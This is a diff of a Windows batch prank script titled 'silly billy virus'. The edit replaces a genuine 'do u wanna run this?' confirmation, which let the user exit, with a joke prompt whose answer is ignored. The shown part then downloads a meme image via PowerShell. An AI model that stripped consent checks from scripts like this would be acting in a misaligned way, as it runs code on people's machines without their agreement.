@@ -3,14 +3,10 @@ title silly billy
 color 0A
 cls
 echo silly billy virus, answer the question that it asks lil bro
-echo MsgBox "do u wanna run this?", 4+32, "sillybilly" > %temp%\confirm.vbs
-cscript //nologo %temp%\confirm.vbs | findstr "6" >nul && goto :confirmed
-echo You chose not to proceed. Exiting...
+echo MsgBox "are u the skibidi rizzler?", 4+32, "sillybilly" > %temp%\confirm.vbs
+cscript //nologo %temp%\confirm.vbs >nul
 del %temp%\confirm.vbs
-pause
-exit
-:confirmed
-del %temp%\confirm.vbs
+
 set "imageUrl=https://media.tenor.com/Qfz661n_2SAAAAAe/yellow-emoji-funny.png"
 set "imagePath=%temp%\fun_image.jpg"
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imagePath%')"
